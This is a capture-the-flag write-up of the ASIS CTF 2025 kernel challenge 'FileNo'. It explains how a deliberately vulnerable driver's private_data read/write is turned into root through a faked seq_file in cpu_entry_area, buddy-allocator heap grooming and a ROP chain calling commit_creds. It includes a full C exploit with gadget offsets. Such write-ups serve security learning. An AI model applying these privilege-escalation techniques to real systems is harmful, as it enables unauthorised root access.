+++
title = 'FileNo - ASIS CTF 2025'
date = 2025-09-07T13:14:32+02:00
draft = false
author = 'Erge & leave'
summary = 'kernel pwn challenge authored by ptr_yudai that we first-blooded at ASISctf 2025'
tags = [
    'linux',
]
toc = true
+++

## Challenge overview
The challenge provides a vulnerable driver that allows a user to arbitrarily read and write the `private_data` field of a regular file.

```c
static long module_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  req_t req;
  struct file *target = NULL;
  long ret = 0;

  if (cmd != CMD_READ && cmd != CMD_WRITE) {
    return -EINVAL;
  }

  if (copy_from_user(&req, (req_t __user *)arg, sizeof(req))) {
    return -EFAULT;
  }

  mutex_lock(&module_lock);

  if (!(target = fget(req.fd))) {
    ret = -EBADF;
    goto unlock_on_fail;
  }

  if (!S_ISREG(file_inode(target)->i_mode)) {
    ret = -EBADF;
    goto unlock_on_fail;
  }

  if (cmd == CMD_READ) {
    req.val = (long)target->private_data;
    if (copy_to_user((req_t __user *)arg, &req, sizeof(req))) {
      ret = -EFAULT;
      goto unlock_on_fail;
    }
  } else {
    target->private_data = (void*)req.val;
  }

 unlock_on_fail:
  if (target) {
    fput(target);
  }

  mutex_unlock(&module_lock);
  return ret;
}
```

## Theory
### What is private_data?
The `private_data` field of a `struct file` contains information specific to the file instance: for example, a pipe's file will point to a structure that casts `private_data` to `pipe_inode_info`, TTYs to `tty_file_private`, and so on.

### What is a "regular file"?
In Linux, a regular file is an inode whose `i_mode` type bits (`S_IFMT`) equal `S_IFREG`, meaning it's a standard data file, not a directory, device, socket or symlink.

## seq_file
The `seq_file` struct is used to implement the content of some the files in `/proc`, `/sys` or debugfs, therefore it's perfect for our usecase given that it ends up in the `private_data` of a regular file; it also contains a vtable, therefore by faking it we can get RIP hijacking. <br>
We'll be using `/proc/self/comm`, which contains the name of the task.

## Leaks
`panic_on_warn` is not set which means that by triggering a kernel warning we can get useful leaks. <br>
What we are going to do is read the address of the `seq_file` struct and shift it by some pages, this way we'll either free an object of a wrong type or free an address that doesn't belong to a cache. Both behaviours trigger a warning: <br>
https://elixir.bootlin.com/linux/v6.12.36/source/mm/slub.c#L4679<br>
https://elixir.bootlin.com/linux/v6.12.36/source/mm/slub.c#L4665

![warn trace](/images/fileno/warn_trace.png)

As you can see, we have a kASLR leak in R11.

## Exploit
The idea is to fake a `seq_file` struct in order to control the vtable. <br>
The easiest way would be placing both the struct and the ROPchain on the heap, but obtaining user controlled data in a cache at a constant offset from the `seq_file` cache leak is unreliable. <br>
Instead, we opted to fake the `seq_file` struct in **cpu_entry_area** (CEA) (in QEMU a leak is not needed, check out our blogpost: https://kqx.io/post/sp0). <br>
Thanks to the fake `seq_file` we can control the vtable and get RIP hijacking. <br>

Ideally we would then pivot the stack to a region with user controlled data, and luckily at [call-time](https://elixir.bootlin.com/linux/v6.12.4/source/fs/seq_file.c#L225) RDI points at our fake `seq_file` struct and **@Erge** found an incredible gadget to perform a `mov rsp, rdi; ret` like operation: <br>

![er gadget](/images/fileno/er_gadget.png)

Now come the problems: there isn't enough space in **CEA** to build the ROPchain (various qwords of the `seq_file` get zeroed out before the RIP hijacking). <br>
Therefore we opted to build the chain on the heap and pivot again with the `add rsp, 0xN; ret` + `pop rsp; ret` gadgets (This sadly adds another layer of complexity to the exploit, hurting its reliability, but it was the fastest path we could think of during the competition). <br>

### User controlled data on heap
We know the address of the `seq_file` cache. We can exploit the buddy allocator in order to reliably have other caches allocated in pages consecutive to the cache we have leaked: <br>

As the name suggests, the **buddy** allocator is based on "buddies", which are pairs of consecutive blocks of pages. <br>
Ignoring the migration types (we only care about unmoveable pages), buddy's freelists are divided by "orders", the number of pages that make up that block (in powers of 2). When an order exhausts its freelist it requests pages from higher orders and split them in buddies, but, as I said, the blocks are made up by consecutive pages. We successfully forced the buddy's freelist to have consecutive pages for a specific order. <br>
For convenience, order 0 (blocks of 1 page) doesn't request from the immediate higher order but from order 4, so we have 16 consecutive pages in the freelist.

Note: When the split of an higher order happens the freelist gets shuffled, so they aren't _exactly_ consecutive but still belonging to those specific 16 pages.

So the plan is:
 - spray enough objects (whatever type, we used creds for simplicity) to make the higher order request happens; <br>
 - spray `seq_file`s to force the cache to reclaim a new slab, which will be allocated from the _consecutive_ pages; <br>
 - spray pipe pages which reclaim whole order 0 pages filled with user controlled data.<br>

If we sprayed correctly, by rounding up the leaked page, we'll obtain the address of a pipe page, thus the address of our ROPchain. <br>

You can check out this blogpost by **@d3vil** to learn more about the buddy allocator's internals: https://syst3mfailure.io/linux-page-allocator/

## Win
We have the pivot, we have the ROPchain, the only thing left to do is to commit root creds and return to userland to `cat` the flag. <br>
Note: the exploit is really unreliable :/

## Full exploit
```c
#include "kpwn.c"

#define CMD_READ   							0x1337
#define CMD_WRITE   						0x1338

#define LEAK 								0xe3f060
#define ADD_RSP_POP_RBX_R12_R13_RBP_RET 	0x9e2383
#define PUSH_RDI_POP_RSP_POP_RBP_RET 		0x4b1a35
#define POP_RSP_RET							0x9da482
#define POP_RDI_RET							0x8df57d
#define INIT_CRED							0xe3bf60
#define COMMIT_CREDS						0x2a3a90
#define SWPAGS_AND_SHIT_103					0x1787

typedef struct {
  int fd;
  long val;
} req_t;

void handle(int s) {}

void win() {
    int fd = open("/dev/sdb", 0);
    char buf[0x50];
    read(fd, buf, 0x50);
    write(1, buf, 0x50);
    while(1){}
}

int main(int argc, char** argv) {
    if (argc == 1) {
		int fd;
		int victim;

		fd = open("/dev/vuln", 0);

		req_t req;
			victim = open("/proc/self/comm", 0);
		req.fd = victim;

		ioctl(fd, CMD_READ, &req);
		req.val = req.val & 0xfffffffffffff000;
		req.val -= 0x6000;
		ioctl(fd, CMD_WRITE, &req);
		close(victim),	
    } else {
    	long kbase;
		long heap;

		int fd;
		int victim;
		int p[0x100][2];

		long fake_struct_addr; 
		size_t fake_struct[15] = {};

		req_t req;
		char buf[0x50];

		char gdt[10];
		long gdt_addr;
		long sp0;

		kbase = strtoul(argv[1], NULL, 0) - LEAK;  
		printf("kbase @ %p\n", kbase);

		asm volatile (
			".intel_syntax noprefix\n"
			"sgdt [%0]\n"
			".att_syntax prefix\n"
			:
			: "r" (&gdt)
			:
		);
		gdt_addr = *(long*) &gdt[2];
		sp0 = gdt_addr + 0x1f58;
		fake_struct_addr = sp0;

		fd = open("/dev/vuln", 0);

		spray_creds(0x600);

		for (int i=0; i<0x30; i++)
			victim = open("/proc/self/comm", 0);

		for(int i=0; i<0x100; i++) 
		pipe(p[i]);

		size_t rop[11] = {
			kbase + POP_RDI_RET,
			kbase + INIT_CRED,
			kbase + COMMIT_CREDS,
			kbase + SWPAGS_AND_SHIT_103,
			0,
			0,
			&win,
			0x33,
			0x206,
			((long) &fd) & (~0xf),
			0x2b
		};

		for(int i=0; i<0x100; i++) 
		write(p[i][1], rop, sizeof(rop));

		req.fd = victim;
		req.val = fake_struct_addr;

		ioctl(fd, CMD_READ, &req);
		heap = req.val & 0xfffffffffffff000;
		printf("heap @ %p\n", heap);

		for(int i=0; i<(sizeof(fake_struct)/sizeof(size_t)); i++)
		fake_struct[i]  = 0;

		fake_struct[0] = 1; //fake m->buf (avoids an allocation)

		fake_struct[1] = kbase + ADD_RSP_POP_RBX_R12_R13_RBP_RET; //jumps to pop rsp

		fake_struct[11] = fake_struct_addr + 10*8; // m->op
		fake_struct[10] = kbase + PUSH_RDI_POP_RSP_POP_RBP_RET; //m->op->start

		fake_struct[13] = kbase + POP_RSP_RET;
		fake_struct[14] = heap + 0x12e000+0x3000 + 0x10000; //pivot

		req.fd = victim;
		req.val = fake_struct_addr;

		ioctl(fd, CMD_WRITE, &req);

		// https://github.com/google/security-research/blob/c6bbc1e706152250c3e412d2c7b9257788665fa1/pocs/linux/kernelctf/CVE-2023-3776_lts/exploit/lts-6.1.36/poc.c#L294
		if (fork() == 0) {
			signal(SIGFPE, handle);
			signal(SIGTRAP, handle);
			signal(SIGSEGV, handle);
			setsid();
			while(1){
				write_to_cpu_entry_area(fake_struct); 
			}
		}
		sleep(1);

		read(victim, buf, 0x10); //triggers m->op->start

		while(1){}
	}
}
```
